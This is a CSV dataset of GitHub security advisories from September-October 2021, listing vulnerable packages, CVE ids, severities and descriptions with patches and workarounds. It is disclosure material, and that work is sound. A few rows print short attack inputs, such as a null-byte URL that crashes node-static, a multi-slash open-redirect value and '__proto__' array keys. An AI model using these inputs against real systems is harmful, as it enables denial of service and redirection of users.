1762,15862,axios,GHSA-cph5-m8f7-6c5x,CVE-2021-3749,https://github.com/advisories/GHSA-cph5-m8f7-6c5x,high,2021-09-01 18:23:02 UTC,axios Inefficient Regular Expression Complexity vulnerability,axios before v0.21.2 is vulnerable to Inefficient Regular Expression Complexity.,npm
1763,16863,next,GHSA-9gr3-7897-pp7m,CVE-2021-39178,https://github.com/advisories/GHSA-9gr3-7897-pp7m,high,2021-09-01 18:24:22 UTC,XSS in Image Optimization API for Next.js,"### Impact
- **Affected:** All of the following must be true to be affected
    - Next.js between version 10.0.0 and 11.1.0
    - The `next.config.js` file has [`images.domains`](https://nextjs.org/docs/basic-features/image-optimization#domains) array assigned
    - The image host assigned in [`images.domains`](https://nextjs.org/docs/basic-features/image-optimization#domains) allows user-provided SVG
- **Not affected**: The `next.config.js` file has [`images.loader`](https://nextjs.org/docs/basic-features/image-optimization#loader) assigned to something other than default
- **Not affected**: Deployments on [Vercel](https://vercel.com) are not affected

### Patches
[Next.js v11.1.1](https://github.com/vercel/next.js/releases/tag/v11.1.1)

",npm
1764,34623,org.neo4j:neo4j,GHSA-pc4w-8v5j-29w9,CVE-2021-34371,https://github.com/advisories/GHSA-pc4w-8v5j-29w9,critical,2021-09-01 18:31:29 UTC,Deserialization of Untrusted Data in Neo4j,"Neo4j through 3.4.18 (with the shell server enabled) exposes an RMI service that arbitrarily deserializes Java objects, e.g., through setSessionVariable. An attacker can abuse this for remote code execution because there are dependencies with exploitable gadget chains.",maven
1765,17303,object-path,GHSA-v39p-96qg-c8rf,CVE-2021-23434,https://github.com/advisories/GHSA-v39p-96qg-c8rf,moderate,2021-09-01 18:37:11 UTC,Prototype Pollution in object-path,"This affects the package object-path before 0.11.6. A type confusion vulnerability can lead to a bypass of CVE-2020-15256 when the path components used in the path parameter are arrays. In particular, the condition currentPath === '__proto__' returns false if currentPath is ['__proto__']. This is because the === operator returns always false when the type of the operands is different.",npm
1766,18829,rdoc,GHSA-ggxm-pgc9-g7fp,CVE-2021-31799,https://github.com/advisories/GHSA-ggxm-pgc9-g7fp,high,2021-09-01 18:53:15 UTC,Arbitrary Code Execution in Rdoc,"In RDoc 3.11 through 6.x before 6.3.1, as distributed with Ruby through 3.0.1, it is possible to execute arbitrary code via | and tags in a filename.",rubygems
1767,16937,immer,GHSA-33f9-j839-rf8h,CVE-2021-23436,https://github.com/advisories/GHSA-33f9-j839-rf8h,critical,2021-09-02 17:17:37 UTC,Prototype Pollution in immer,"This affects the package immer before 9.0.6. A type confusion vulnerability can lead to a bypass of CVE-2020-28477 when the user-provided keys used in the path parameter are arrays. In particular, this bypass is possible because the condition (p === ""__proto__"" || p === ""constructor"") in applyPatches_ returns false if p is ['__proto__'] (or ['constructor']). The === operator (strict equality operator) returns false if the operands have different type.",npm
1768,17878,hbs,GHSA-7f5c-rpf4-86p8,CVE-2021-32822,https://github.com/advisories/GHSA-7f5c-rpf4-86p8,moderate,2021-09-02 17:16:46 UTC,Insertion of Sensitive Information into Externally-Accessible File or Directory and Exposure of Sensitive Information to an Unauthorized Actor in hbs,"The npm hbs package is an Express view engine wrapper for Handlebars. Depending on usage, users of hbs may be vulnerable to a file disclosure vulnerability. There is currently no patch for this vulnerability. hbs mixes pure template data with engine configuration options through the Express render API. By overwriting internal configuration options a file disclosure vulnerability may be triggered in downstream applications. For an example PoC see the referenced GHSL-2021-020.",npm
1769,22243,kubernetes,GHSA-mfv7-gq43-w965,CVE-2021-25737,https://github.com/advisories/GHSA-mfv7-gq43-w965,moderate,2021-09-07 23:09:24 UTC,Incomplete List of Disallowed Inputs in Kubernetes,"A security issue was discovered in Kubernetes where a user may be able to redirect pod traffic to private networks on a Node. Kubernetes already prevents creation of Endpoint IPs in the localhost or link-local range, but the same validation was not performed on EndpointSlice IPs.",go
1770,19224,better_errors,GHSA-w3j4-76qw-wwjm,CVE-2021-39197,https://github.com/advisories/GHSA-w3j4-76qw-wwjm,moderate,2021-09-07 23:08:24 UTC,Older releases of better_errors open to Cross-Site Request Forgery attack,"### Impact
better_errors prior to 2.8.0 did not implement CSRF protection for its internal requests. It also did not enforce the correct ""Content-Type"" header for these requests, which allowed a cross-origin ""simple request"" to be made without CORS protection. These together left an application with better_errors enabled open to cross-origin attacks.

_As a developer tool, better_errors documentation strongly recommends addition only to the `development` bundle group, so this vulnerability should only affect development environments. Please ensure that your project limits better_errors to the `development` group (or the non-Rails equivalent)._

### Patches
Starting with release 2.8.x, CSRF protection is enforced. It is recommended that you upgrade to the latest release, or minimally to ""~> 2.8.3"".

### Workarounds
There are no known workarounds to mitigate the risk of using older releases of better_errors.

### References
- Chris Moberly provided [an example attack that uses a now-patched vulnerability of webpack-dev-server in conjunction with Better Errors](https://about.gitlab.com/blog/2021/09/07/why-are-developers-vulnerable-to-driveby-attacks/)

### For more information
If you have any questions or comments about this advisory, please
- Add to the [discussion in better_errors](https://github.com/BetterErrors/better_errors/discussions/507)
- Open an issue in [better_errors](https://github.com/BetterErrors/better_errors)
",rubygems
1771,16937,immer,GHSA-c36v-fmgq-m8hx,CVE-2021-3757,https://github.com/advisories/GHSA-c36v-fmgq-m8hx,high,2021-09-07 22:57:14 UTC,Prototype Pollution in immer,immer is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').,npm
1772,28945,Flask-AppBuilder,GHSA-624f-cqvr-3qw4,CVE-2021-32805,https://github.com/advisories/GHSA-624f-cqvr-3qw4,high,2021-09-08 21:11:14 UTC,URL Redirection to Untrusted Site ('Open Redirect') in Flask-AppBuilder,"### Impact
If using Flask-AppBuilder OAuth, an attacker can share a carefully crafted URL with a trusted domain for an application built with Flask-AppBuilder, this URL can redirect a user to a malicious site. This is an open redirect vulnerability 

### Patches
Install Flask-AppBuilder 3.2.2 or above

### Workarounds
Filter HTTP traffic containing `?next={next-site}` where the `next-site` domain is different from the application you are protecting
",pip
1773,22315,consul,GHSA-ccw8-7688-vqx4,CVE-2021-37219,https://github.com/advisories/GHSA-ccw8-7688-vqx4,high,2021-09-08 20:14:48 UTC,Privilege Escalation in HashiCorp Consul,"HashiCorp Consul and Consul Enterprise 1.10.1 Raft RPC layer allows non-server agents with a valid certificate signed by the same CA to access server-only functionality, enabling privilege escalation. Fixed in 1.8.15, 1.9.9 and 1.10.2.",go
1774,24191,nomad,GHSA-c8x3-rg72-fwwg,CVE-2021-37218,https://github.com/advisories/GHSA-c8x3-rg72-fwwg,high,2021-09-08 20:14:38 UTC,Privilege escalation in Hashicorp Nomad,"HashiCorp Nomad and Nomad Enterprise Raft RPC layer allows non-server agents with a valid certificate signed by the same CA to access server-only functionality, enabling privilege escalation. Fixed in 1.0.10 and 1.1.4.",go
1775,22315,consul,GHSA-6hw5-6gcx-phmw,CVE-2021-38698,https://github.com/advisories/GHSA-6hw5-6gcx-phmw,moderate,2021-09-08 20:14:56 UTC,"HashiCorp Consul and Consul Enterprise 1.10.1 Txn.Apply endpoint allowed services to register proxies for other services, enabling access to service traffic.","HashiCorp Consul and Consul Enterprise 1.10.1 Txn.Apply endpoint allowed services to register proxies for other services, enabling access to service traffic. Fixed in 1.8.15, 1.9.9 and 1.10.2.",go
1776,20039,sqlparse,GHSA-p5w8-wqhj-9hhf,CVE-2021-32839,https://github.com/advisories/GHSA-p5w8-wqhj-9hhf,high,2021-09-10 17:56:06 UTC,StripComments filter contains a regular expression that is vulnerable to ReDOS (Regular Expression Denial of Service),"### Impact
The formatter function that strips comments from a SQL contains a regular expression that is vulnerable to [ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) (Regular Expression Denial of Service). The regular expression may cause exponential backtracking on strings containing many repetitions of '\r\n' in SQL comments.

### Patches
The issues has been fixed in sqlparse 0.4.2.

### Workarounds
Only the formatting feature that removes comments from SQL statements is affected by this regular expression. As a workaround don't use the `sqlformat.format` function with keyword `strip_comments=True` or the `--strip-comments` command line flag when using the `sqlformat` command line tool.

### References
This issue was discovered by GitHub team members @erik-krogh and @yoff. It was found using a [CodeQL](https://codeql.github.com/) query which identifies inefficient regular expressions. You can see the results of the query on python-sqlparse by following [this link](https://lgtm.com/query/2223658096471222354/). 

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [sqlparse issue tracker](https://github.com/andialbrecht/sqlparse/issues)
* Email us at [albrecht.andi@gmail.com](mailto:albrecht.andi@gmail.com)
",pip
1777,28279,clearance,GHSA-4hpq-rjcx-7vj9,CVE-2021-23435,https://github.com/advisories/GHSA-4hpq-rjcx-7vj9,high,2021-09-13 20:05:09 UTC,Open Redirect in clearance,This affects the package clearance before 2.5.0. The vulnerability can be possible when users are able to set the value of session[:return_to]. If the value used for return_to contains multiple leading slashes (/////example.com) the user ends up being redirected to the external domain that comes after the slashes (http://example.com).,rubygems
1778,16351,prismjs,GHSA-hqhp-5p83-hx96,CVE-2021-3801,https://github.com/advisories/GHSA-hqhp-5p83-hx96,moderate,2021-09-20 20:44:48 UTC,prismjs Regular Expression Denial of Service vulnerability,Prism is a syntax highlighting library. The prismjs package is vulnerable to ReDoS (regular expression denial of service). An attacker that is able to provide a crafted HTML comment as input may cause an application to consume an excessive amount of CPU.,npm
1779,29928,apprise,GHSA-qhmp-h54x-38qr,CVE-2021-39229,https://github.com/advisories/GHSA-qhmp-h54x-38qr,high,2021-09-20 20:57:02 UTC,CWE-730 Regex injection with IFTTT Plugin,"### Impact
Anyone _publicly_ hosting the Apprise library and granting them access to the IFTTT notification service.

### Patches
Update to Apprise v0.9.5.1
   ```bash
   # Install Apprise v0.9.5.1 from PyPI
   pip install apprise==0.9.5.1
   ```

The patch to the problem was performed [here](https://github.com/caronc/apprise/pull/436/files).

### Workarounds
Alternatively, if upgrading is not an option, you can safely remove the following file:
- `apprise/plugins/NotifyIFTTT.py` 

The above will eliminate the ability to use IFTTT, but everything else will work smoothly.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [Apprise](https://github.com/caronc/apprise/issues)
* Email me at [lead2gold@gmail.com](mailto:lead2gold@gmail.com)

### Additional Credit
Github would not allow me to additionally credit **Rasmus Petersen**, but I would like to put that here at the very least - thank you for finding and reporting this issue along with those already credited

## Additional Notes:
- Github would not allow me to add/tag the 2 CWE's this issue is applicable to (only CWE-400).  The other is: CWE-730 (placed in the title)
",pip
1780,34807,org.apache.santuario:xmlsec,GHSA-j8wc-gxx9-82hx,CVE-2021-40690,https://github.com/advisories/GHSA-j8wc-gxx9-82hx,high,2021-09-20 23:18:41 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache Santuario,"All versions of Apache Santuario - XML Security for Java prior to 2.2.3 and 2.1.7 are vulnerable to an issue where the ""secureValidation"" property is not passed correctly when creating a KeyInfo from a KeyInfoReference element. This allows an attacker to abuse an XPath Transform to extract any local .xml files in a RetrievalMethod element.",maven
1781,17303,object-path,GHSA-8v63-cqqc-6r2c,CVE-2021-3805,https://github.com/advisories/GHSA-8v63-cqqc-6r2c,high,2021-09-20 20:46:43 UTC,Prototype Pollution in object-path,"object-path is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). The `del()` function fails to validate which Object properties it deletes. This allows attackers to modify the prototype of Object, causing the modification of default properties like `toString` on all objects.",npm
1782,34422,org.apache.shiro:shiro-core,GHSA-f6jp-j6w3-w9hm,CVE-2021-41303,https://github.com/advisories/GHSA-f6jp-j6w3-w9hm,critical,2021-09-20 20:18:11 UTC,Apache Shiro vulnerable to a specially crafted HTTP request causing an authentication bypass,"Apache Shiro before 1.8.0, when using Apache Shiro with Spring Boot, a specially crafted HTTP request may cause an authentication bypass. Users should update to Apache Shiro 1.8.0.",maven
1783,17917,ansi-regex,GHSA-93q8-gq69-wqmw,CVE-2021-3807,https://github.com/advisories/GHSA-93q8-gq69-wqmw,high,2021-09-20 20:20:09 UTC,Inefficient Regular Expression Complexity in chalk/ansi-regex,ansi-regex is vulnerable to Inefficient Regular Expression Complexity which could lead to a denial of service.,npm
1784,29639,mitmproxy,GHSA-22gh-3r9q-xf38,CVE-2021-39214,https://github.com/advisories/GHSA-22gh-3r9q-xf38,high,2021-09-20 19:53:30 UTC,Lacking Protection against HTTP Request Smuggling in mitmproxy,"### Impact

In mitmproxy 7.0.2 and below, a malicious client or server is able to perform [HTTP request smuggling](https://en.wikipedia.org/wiki/HTTP_request_smuggling) attacks through mitmproxy. This means that a malicious client/server could smuggle a request/response through mitmproxy as part of another request/response's HTTP message body. While mitmproxy would only see one request, the target server would see multiple requests. A smuggled request is still captured as part of another request's body, but it does not appear in the request list and does not go through the usual mitmproxy event hooks, where users may have implemented custom access control checks or input sanitization.

Unless you use mitmproxy to protect an HTTP/1 service, no action is required.


### Patches

The vulnerability has been fixed in mitmproxy 7.0.3 and above.


### Acknowledgements

We thank João Sobral (@chinchila) for responsibly disclosing this vulnerability to the mitmproxy team.


### Timeline

- **2021-09-08**: Received initial report for mitmproxy <= 6.0.2.
- **2021-09-08**: Requested clarification if 7.x is affected.
- **2021-09-10**: Received additional details, 7.x situation still unclear.
- **2021-09-13**: Internally determined that 7.x is also affected.
- **2021-09-13**: Shared initial fix with researcher.
- **2021-09-14**: Received confirmation that fix is working, but H2.TE/H2.CL should also be looked at.
- **2021-09-14**: Shared revised fix that includes additional H2.TE mitigations.
- **2021-09-14**: Received confirmation that revised fix is working.
- **2021-09-16**: Completed internal patch review.
- **2021-09-16**: Published patch release and advisory.",pip
1785,34951,org.apache.jena:jena-core,GHSA-7rp6-w7mg-h8rw,CVE-2021-39239,https://github.com/advisories/GHSA-7rp6-w7mg-h8rw,high,2021-09-20 20:22:05 UTC,XML External Entity Reference in Apache Jena,"A vulnerability in XML processing in Apache Jena, in versions up to 4.1.0, may allow an attacker to execute XML External Entities (XXE), including exposing the contents of local files to a remote server.",maven
1786,35825,org.keycloak:keycloak-core,GHSA-4gf2-xv97-63m2,CVE-2020-1744,https://github.com/advisories/GHSA-4gf2-xv97-63m2,moderate,2021-09-20 20:43:24 UTC,Exposure of Sensitive Information in keycloak,"A flaw was found in keycloak before version 9.0.1. When configuring an Conditional OTP Authentication Flow as a post login flow of an IDP, the failure login events for OTP are not being sent to the brute force protection event queue. So BruteForceProtector does not handle this events.",maven
1787,34041,org.elasticsearch:elasticsearch,GHSA-45h5-r968-5xr7,CVE-2021-22147,https://github.com/advisories/GHSA-45h5-r968-5xr7,moderate,2021-09-20 20:29:40 UTC,Exposure of sensitive information in Elasticsearch,A flaw was discovered in Elasticsearch where document and field level security was not applied to searchable snapshots. This could lead to an authenticated user gaining access to information that they are unauthorized to view.,maven
1788,22243,kubernetes,GHSA-vw47-mr44-3jf9,CVE-2021-25740,https://github.com/advisories/GHSA-vw47-mr44-3jf9,low,2021-09-21 18:28:30 UTC,Confused Deputy in Kubernetes,A security issue was discovered with Kubernetes that could enable users to send network traffic to locations they would otherwise not have access to via a confused deputy attack.,go
1789,22243,kubernetes,GHSA-74j8-88mm-7496,CVE-2020-8561,https://github.com/advisories/GHSA-74j8-88mm-7496,moderate,2021-09-21 18:28:21 UTC,Confused Deputy in Kubernetes,"A security issue was discovered in Kubernetes where actors that control the responses of MutatingWebhookConfiguration or ValidatingWebhookConfiguration requests are able to redirect kube-apiserver requests to private networks of the apiserver. If that user can view kube-apiserver logs when the log level is set to 10, they can view the redirected responses and headers in the logs.",go
1790,16969,ssh2,GHSA-652h-xwhf-q4h6,CVE-2020-26301,https://github.com/advisories/GHSA-652h-xwhf-q4h6,high,2021-09-21 16:50:46 UTC,OS Command Injection in ssh2,ssh2 is client and server modules written in pure JavaScript for node.js. In ssh2 before version 1.4.0 there is a command injection vulnerability. The issue only exists on Windows. This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input. This is fixed in version 1.4.0.,npm
1791,16814,node-static,GHSA-8r4g-cg4m-x23c,,https://github.com/advisories/GHSA-8r4g-cg4m-x23c,moderate,2021-09-22 18:22:02 UTC,Denial of Service in node-static,All versions of node-static are vulnerable to a Denial of Service. The package fails to catch an exception when user input includes null bytes. This allows attackers to access `http://host/%00` and crash the server.,npm
1792,19832,Django,GHSA-xpfp-f569-q3p2,CVE-2021-35042,https://github.com/advisories/GHSA-xpfp-f569-q3p2,critical,2021-09-22 17:34:49 UTC,SQL Injection in Django,Django 3.1.x before 3.1.13 and 3.2.x before 3.2.5 allows QuerySet.order_by SQL injection if order_by is untrusted input from a client of a web application.,pip
1793,20092,ansible,GHSA-2pfh-q76x-gwvm,CVE-2021-3583,https://github.com/advisories/GHSA-2pfh-q76x-gwvm,high,2021-09-23 23:16:38 UTC,Improper Input Validation and Command Injection in Ansible,"A flaw was found in Ansible, where a user's controller is vulnerable to template injection. This issue can occur through facts used in the template if the user is trying to put templates in multi-line YAML strings and the facts being handled do not routinely include special template characters. This flaw allows attackers to perform command injection, which discloses sensitive information. The highest threat from this vulnerability is to confidentiality and integrity.",pip
1794,34301,io.netty:netty-codec,GHSA-grg4-wf29-r9vv,CVE-2021-37136,https://github.com/advisories/GHSA-grg4-wf29-r9vv,high,2021-09-09 17:11:21 UTC,Bzip2Decoder doesn't allow setting size restrictions for decompressed data,"### Impact
The Bzip2 decompression decoder function doesn't allow setting size restrictions on the decompressed output data (which affects the allocation size used during decompression).


All users of Bzip2Decoder are affected. The malicious input can trigger an OOME and so a DoS attack

### Workarounds
No workarounds other than not using the `Bzip2Decoder`

### References

Relevant code areas:

https://github.com/netty/netty/blob/netty-4.1.67.Final/codec/src/main/java/io/netty/handler/codec/compression/Bzip2Decoder.java#L80
https://github.com/netty/netty/blob/netty-4.1.67.Final/codec/src/main/java/io/netty/handler/codec/compression/Bzip2Decoder.java#L294
https://github.com/netty/netty/blob/netty-4.1.67.Final/codec/src/main/java/io/netty/handler/codec/compression/Bzip2Decoder.java#L305",maven
1795,34301,io.netty:netty-codec,GHSA-9vjp-v76f-g363,CVE-2021-37137,https://github.com/advisories/GHSA-9vjp-v76f-g363,high,2021-09-09 17:11:31 UTC,SnappyFrameDecoder doesn't restrict chunk length any may buffer skippable chunks in an unnecessary way,"### Impact
The Snappy frame decoder function doesn't restrict the chunk length which may lead to excessive memory usage. Beside this it also may buffer reserved skippable chunks until the whole chunk was received which may lead to excessive memory usage as well.

This vulnerability can be triggered by supplying malicious input that decompresses to a very big size (via a network stream or a file) or by sending a huge skippable chunk.

### Impact

All users of SnappyFrameDecoder are affected and so the application may be in risk for a DoS attach due excessive memory usage.

### References
https://github.com/netty/netty/blob/netty-4.1.67.Final/codec/src/main/java/io/netty/handler/codec/compression/SnappyFrameDecoder.java#L79
https://github.com/netty/netty/blob/netty-4.1.67.Final/codec/src/main/java/io/netty/handler/codec/compression/SnappyFrameDecoder.java#L171
https://github.com/netty/netty/blob/netty-4.1.67.Final/codec/src/main/java/io/netty/handler/codec/compression/SnappyFrameDecoder.java#L185",maven
1796,18823,nokogiri,GHSA-2rr5-8q37-2w7h,CVE-2021-41098,https://github.com/advisories/GHSA-2rr5-8q37-2w7h,high,2021-09-27 20:12:47 UTC,Improper Restriction of XML External Entity Reference (XXE) in Nokogiri on JRuby,"### Severity

The Nokogiri maintainers have evaluated this as [**High Severity** 7.5 (CVSS3.0)](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:H/RL:O/RC:C/MAV:N/MAC:L) for JRuby users. (This security advisory does not apply to CRuby users.)


### Impact

In Nokogiri v1.12.4 and earlier, **on JRuby only**, the SAX parser resolves external entities by default.

Users of Nokogiri on JRuby who parse untrusted documents using any of these classes are affected:

- Nokogiri::XML::SAX::Parser
- Nokogiri::HTML4::SAX::Parser or its alias Nokogiri::HTML::SAX::Parser
- Nokogiri::XML::SAX::PushParser
- Nokogiri::HTML4::SAX::PushParser or its alias Nokogiri::HTML::SAX::PushParser


### Mitigation

JRuby users should upgrade to Nokogiri v1.12.5 or later. There are no workarounds available for v1.12.4 or earlier.

CRuby users are not affected.",rubygems
1797,35471,com.google.oauth-client:google-oauth-client,GHSA-f263-c949-w85g,CVE-2020-7692,https://github.com/advisories/GHSA-f263-c949-w85g,high,2021-09-28 16:16:52 UTC,Improper Authorization in Google OAuth Client,"PKCE support is not implemented in accordance with the RFC for OAuth 2.0 for Native Apps. Without the use of PKCE, the authorization code returned by an authorization server is not enough to guarantee that the client that issued the initial authorization request is the one that will be authorized. An attacker is able to obtain the authorization code using a malicious app on the client-side and use it to gain authorization to the protected resource. This affects the package com.google.oauth-client:google-oauth-client before 1.31.0.",maven
1798,17962,passport-oauth2,GHSA-f794-r6xc-hf3v,CVE-2021-41580,https://github.com/advisories/GHSA-f794-r6xc-hf3v,moderate,2021-09-29 17:18:32 UTC,Improper Access Control in passport-oauth2,"The passport-oauth2 package before 1.6.1 for Node.js mishandles the error condition of failure to obtain an access token. This is exploitable in certain use cases where an OAuth identity provider uses an HTTP 200 status code for authentication-failure error reports, and an application grants authorization upon simply receiving the access token (i.e., does not try to use the token). NOTE: the passport-oauth2 vendor does not consider this a passport-oauth2 vulnerability.",npm
1799,20023,nltk,GHSA-2ww3-fxvq-293j,CVE-2021-3828,https://github.com/advisories/GHSA-2ww3-fxvq-293j,high,2021-09-29 17:14:53 UTC,Inefficient Regular Expression in nltk,nltk is contains an Inefficient Regular Expression and is vulnerable to regular expression denial of service attacks.,pip
1800,17326,i,GHSA-x55w-vjjp-222r,CVE-2021-3820,https://github.com/advisories/GHSA-x55w-vjjp-222r,high,2021-09-29 17:12:19 UTC,inflect vulnerable to Inefficient Regular Expression Complexity,inflect is customizable inflections for nodejs. inflect is vulnerable to Inefficient Regular Expression Complexity,npm
1801,30455,shuup,GHSA-663j-rjcr-789f,CVE-2021-25962,https://github.com/advisories/GHSA-663j-rjcr-789f,high,2021-09-30 20:50:07 UTC,CSV injection in shuup,"“Shuup” application in versions 0.4.2 to 2.10.8 is affected by the “Formula Injection” vulnerability. A customer can inject payloads in the name input field in the billing address while buying a product. When a store administrator accesses the reports page to export the data as an Excel file and opens it, the payload gets executed.",pip
1802,23183,containerd,GHSA-c2h3-6mxw-7mvq,CVE-2021-41103,https://github.com/advisories/GHSA-c2h3-6mxw-7mvq,moderate,2021-10-04 20:14:47 UTC,Insufficiently restricted permissions on plugin directories,"### Impact
A bug was found in containerd where container root directories and some plugins had insufficiently restricted permissions, allowing otherwise unprivileged Linux users to traverse directory contents and execute programs. When containers included executable programs with extended permission bits (such as setuid), unprivileged Linux users could discover and execute those programs. When the UID of an unprivileged Linux user on the host collided with the file owner or group inside a container, the unprivileged Linux user on the host could discover, read, and modify those files.

### Patches
This vulnerability has been fixed in containerd 1.4.11 and containerd 1.5.7. Users should update to these version when they are released and may restart containers or update directory permissions to mitigate the vulnerability.

### Workarounds
Limit access to the host to trusted users. Update directory permission on container bundles directories. 

### For more information
If you have any questions or comments about this advisory: 
* Open an issue in [github.com/containerd/containerd](https://github.com/containerd/containerd/issues/new/choose)
* Email us at [security@containerd.io](mailto:security@containerd.io)
",go
1803,38609,org.apache.ddlutils:ddlutils,GHSA-9378-f4v7-jgm4,CVE-2021-41616,https://github.com/advisories/GHSA-9378-f4v7-jgm4,critical,2021-10-04 20:12:30 UTC,Deserialization of Untrusted Data in org.apache.ddlutils:ddlutils,"Apache DB DdlUtils 1.0 included a BinaryObjectsHelper that was intended for use when migrating database data with a SQL data type of BINARY, VARBINARY, LONGVARBINARY, or BLOB between databases using the ddlutils features. The BinaryObjectsHelper class was insecure and used ObjectInputStream.readObject without validating that the input data was safe to deserialize. Please note that DdlUtils is no longer being actively developed. To address the insecurity of the BinaryObjectHelper class, the following changes to DdlUtils have been made: (1) BinaryObjectsHelper.java has been deleted from the DdlUtils source repository and the DdlUtils feature of propagating data of SQL binary types is therefore no longer present in DdlUtils; (2) The ddlutils-1.0 release has been removed from the Apache Release Distribution Infrastructure; (3) The DdlUtils web site has been updated to indicate that DdlUtils is now available only as source code, not as a packaged release.",maven
1804,30455,shuup,GHSA-5pcx-vqjp-p34w,CVE-2021-25963,https://github.com/advisories/GHSA-5pcx-vqjp-p34w,moderate,2021-10-04 20:11:03 UTC,Cross-site Scripting in shuup,"In Shuup, versions 1.6.0 through 2.10.8 are vulnerable to reflected Cross-Site Scripting (XSS) that allows execution of arbitrary javascript code on a victim browser. This vulnerability exists due to the error page contents not escaped.",pip
1805,18808,lodash,GHSA-8p5q-j9m2-g8wr,CVE-2021-41720,https://github.com/advisories/GHSA-8p5q-j9m2-g8wr,low,2021-12-03 20:37:32 UTC,Withdrawn: Arbitrary code execution in lodash,"# Withdrawn

GitHub has chosen to publish this CVE as a withdrawn advisory due to it not being a security issue. See [this issue](https://github.com/lodash/lodash/issues/5261) for more details.

# CVE description

""** DISPUTED ** A command injection vulnerability in Lodash 4.17.21 allows attackers to achieve arbitrary code execution via the template function. This is a different parameter, method, and version than CVE-2021-23337. NOTE: the vendor's position is that it's the developer's responsibility to ensure that a template does not evaluate code that originates from untrusted input.",npm
1806,20044,Scrapy,GHSA-jwqp-28gf-p498,CVE-2021-41125,https://github.com/advisories/GHSA-jwqp-28gf-p498,moderate,2021-10-06 17:46:22 UTC,HTTP authentication credentials potentially leaked to target websites,"### Impact

If you use [`HttpAuthMiddleware`](http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth) (i.e. the `http_user` and `http_pass` spider attributes) for HTTP authentication, all requests will expose your credentials to the request target.

This includes requests generated by Scrapy components, such as `robots.txt` requests sent by Scrapy when the `ROBOTSTXT_OBEY` setting is set to `True`, or as requests reached through redirects.

### Patches

Upgrade to Scrapy 2.5.1 and use the new `http_auth_domain` spider attribute to control which domains are allowed to receive the configured HTTP authentication credentials.

If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.5.1 is not an option, you may upgrade to Scrapy 1.8.1 instead.

### Workarounds

If you cannot upgrade, set your HTTP authentication credentials on a per-request basis, using for example the [`w3lib.http.basic_auth_header`](https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header) function to convert your credentials into a value that you can assign to the `Authorization` header of your request, instead of defining your credentials globally using [`HttpAuthMiddleware`](http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth).

### For more information
If you have any questions or comments about this advisory:
* [Open an issue](https://github.com/scrapy/scrapy/issues)
* [Email us](mailto:opensource@zyte.com)
",pip
1807,18948,sidekiq,GHSA-grh7-935j-hg6w,CVE-2021-30151,https://github.com/advisories/GHSA-grh7-935j-hg6w,moderate,2021-10-06 17:47:17 UTC,Cross-site Scripting in Sidekiq,Sidekiq through 5.1.3 and 6.x through 6.2.0 allows XSS via the queue name of the live-poll feature when Internet Explorer is used.,rubygems
1808,30443,vyper,GHSA-c7pr-343r-5c46,CVE-2021-41122,https://github.com/advisories/GHSA-c7pr-343r-5c46,moderate,2021-10-06 17:48:46 UTC,missing clamps for decimal args in external functions,"### Impact

The following code does not properly validate that its input is in bounds.

```python
@external
def foo(x: decimal) -> decimal:
    return x
```

### Patches
0.3.0 / #2447

### Workarounds
Don't use decimal args

",pip
1809,16343,electron,GHSA-mpjm-v997-c4h4,CVE-2021-39184,https://github.com/advisories/GHSA-mpjm-v997-c4h4,moderate,2021-10-12 21:59:13 UTC,Electron's sandboxed renderers can obtain thumbnails of arbitrary files through the nativeImage API,"### Impact
This vulnerability allows a sandboxed renderer to request a ""thumbnail"" image of an arbitrary file on the user's system. The thumbnail can potentially include significant parts of the original file, including textual data in many cases.

All current stable versions of Electron are affected.

### Patches
This was fixed with #30728, and the following Electron versions contain the fix:

- 15.0.0-alpha.10
- 14.0.0
- 13.3.0
- 12.1.0
- 11.5.0

### Workarounds
If your app enables `contextIsolation`, this vulnerability is significantly more difficult for an attacker to exploit.

Further, if your app does not depend on the `createThumbnailFromPath` API, then you can simply disable the functionality. In the main process, before the 'ready' event:
```js
delete require('electron').nativeImage.createThumbnailFromPath
```

### For more information
If you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org).",npm
1810,14413,System.DirectoryServices.Protocols,GHSA-9cxh-gqpx-qc5m,CVE-2021-41355,https://github.com/advisories/GHSA-9cxh-gqpx-qc5m,moderate,2021-10-12 17:49:25 UTC,Credential Disclosure in System.DirectoryServices.Protocols,"Microsoft is releasing this security advisory to provide information about a vulnerability in .NET. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

A Information Disclosure vulnerability exists in .NET where System.DirectoryServices.Protocols.LdapConnection may send credentials in plain text on Linux.

### Patches
Any .NET application that uses `System.DirectoryServices.Protocols` with a vulnerable version listed below on system based on Linux.

Package name | Vulnerable versions | Secure versions
------------ | ---------------- | -------------------------
System.DirectoryServices.Protocols | 5.0.0  | 5.0.1

### Other Details

- Announcement for this issue can be found at dotnet/announcements#202
- An Issue for this can be found at https://github.com/dotnet/runtime/issues/60301
- MSRC details for this can be found at https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-41355",nuget
1811,18987,puma,GHSA-48w2-rm65-62xx,CVE-2021-41136,https://github.com/advisories/GHSA-48w2-rm65-62xx,low,2021-10-12 17:53:00 UTC,Puma with proxy which forwards LF characters as line endings could allow HTTP request smuggling,"### Impact

Prior to `puma` version 5.5.0, using `puma` with a proxy which forwards LF characters as line endings could allow HTTP request smuggling. A client could smuggle a request through a proxy, causing the proxy to send a response back to another unknown client.

This behavior (forwarding LF characters as line endings) is very uncommon amongst proxy servers, so we have graded the impact here as ""low"". Puma is only aware of a single proxy server which has this behavior.

If the proxy uses persistent connections and the client adds another request in via HTTP pipelining, the proxy may mistake it as the first request's body. Puma, however, would see it as two requests, and when processing the second request, send back a response that the proxy does not expect. If the proxy has reused the persistent connection to Puma to send another request for a different client, the second response from the first client will be sent to the second client.

### Patches

